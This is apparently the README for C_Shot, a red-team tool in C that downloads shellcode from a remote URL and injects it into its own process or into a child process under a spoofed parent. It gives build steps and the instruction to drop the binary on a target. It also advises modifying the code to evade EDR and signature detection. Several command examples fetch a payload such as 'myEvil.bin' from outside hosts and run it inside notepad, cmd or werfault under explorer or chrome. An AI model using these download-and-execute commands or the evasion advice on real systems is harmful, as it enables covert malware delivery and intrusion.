# C_Shot

Description
============

C_Shot is an offensive security tool written in C which is designed to download, inject, and execute shellcode in memory.  Depending on the arguments used, this can be accomplished via two different methods:

**1. Inject into its own process** 

   C_Shot will download your remote .bin file, inject and execute it inside C_Shot's own process.
 
**2. Inject into child process using parent process spoofing**

   C_Shot will download your remote .bin file, spoof a specified parent process, open a specified child process (with optional commandline args) under the specified parent process, then inject and execute it inside the child process.
   
**Contact at:**
- Twitter: @anthemtotheego

**Shoutout and Contribution:** 
- Jacob Moody: Huge thanks for helping me better understand C concepts when I first started to dive into learning the language.

**Quick blog:**

http://blog.redxorblue.com/2020/07/cshot-just-what-doctor-ordered.html

**Extras:**

Included is a python script ShellcodeToBin.py that will convert your shellcode to a .bin file if needed.

**Before submitting issues, this tool may not always be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, there is a lot of awesome code examples out there that can be taken/modified to create your own custom tools.**

Setup - Quick and Dirty
==============================

**Note: For those of you who don't want to go through the trouble of compiling your own I uploaded an x64 and x86 binary found in the CompiledBinaries folder.  For those of you who do want to compile your own... I used Windows 10, Visual Studio 2019 - mileage may vary**

1. Download C_Shot project solution

2. Now do a windows search for Developer Command Prompt for VS 2019 and right click > open folder location                         

3. Browse to VC folder and select the Developer Command Prompt with the correct arch for the target system (x86 or x64)

4. Inside the Developer Command Prompt browse to the C_Shot directory where cshot.c is located

5. Run the following command to build C_Shot - ```cl /D _UNICODE /D UNICODE cshot.c```

6. You will see some compile warnings (can ignore) but you should now have an executable named cshot.exe

7. Drop on target system you are testing and run

Important Notes
===============

**1. Architecture of C_Shot and the shellcode you are retrieving should be the same.**

**2. This tool is written in C which is an unmanaged language.**

**3. PAGE_EXECUTE_READWRITE permissions are used in this open source POC, among other IOCs. This was done intentionally and as always, I would suggest going through and modifying the code to help get around signature/behavior based analysis.**

**4. While C_Shot can absolutely help you on your journey of executing shellcode succesfully, it can only help you with so much.  If you choose to execute for example, the widely known default staged meterpreter payload, decent EDR products (but not all) will most likely flag it upon execution of the shellcode due to known behaviors or signatures.  In most cases (but not all) this will not be a C_Shot problem but a shellcode behavior/obfuscation problem.  This however is usually easily fixed.**

C_Shot Syntax Examples
=====================

   **Download a bin file and execute shellcode into your own process**
   
   *General Syntax*
   
```cshot.exe https://Domain_or_IP/myEvil.bin  Port```

   *Examples*
   
```cshot.exe https://github.com/anthemtotheego/public/blob/master/StagelessShellcode.bin?raw=true 443```

```cshot.exe http://192.168.1.10/StagedShellcode.bin 8080```

   **Download a .bin file and execute shellcode in a chosen child process under a chosen spoofed parent process**
   
   *General Syntax*
   
```cshot.exe https://Domain_or_IP/myEvil.bin  Port ParentProcess.exe C:\Full\Path\ToChildProcess.exe```

   *or*
   
  ```cshot.exe https://Domain_or_IP/myEvil.bin  Port ParentProcess.exe C:\Full\Path\ToChildProcess.exe "my child process commandline args here"```

   *Examples*
   
```cshot.exe https://github.com/anthemtotheego/public/blob/master/StagelessShellcode.bin?raw=true 443 explorer.exe c:\windows\system32\notepad.exe```

```cshot.exe https://github.com/anthemtotheego/public/blob/master/StagelessShellcode.bin?raw=true 443 explorer.exe c:\windows\system32\cmd.exe "ipconfig /all"```

```cshot.exe https://192.168.1.10/StagedShellcode.bin 8443 chrome.exe c:\windows\system32\werfault.exe```


Convert Shellcode To Bin File 
=============================

**Included ShellcodeToBin.py script** 

1. Open up ShellcodeToBin.py in a text editor, paste in shellcode, save and run it.

2. This will produce a bin file you can download with C_Shot and execute.

Code References 
===============

*Parent Process Spoofing*

```https://github.com/hlldz/APC-PPID```

*ShellcodeToBin.py script*

```https://diego.assencio.com/?index=99d3134bb98fdcc9a7c2bd6071db737d```

*Everything else*

```MSDN```

```Unsung heroes of stackoverflow```
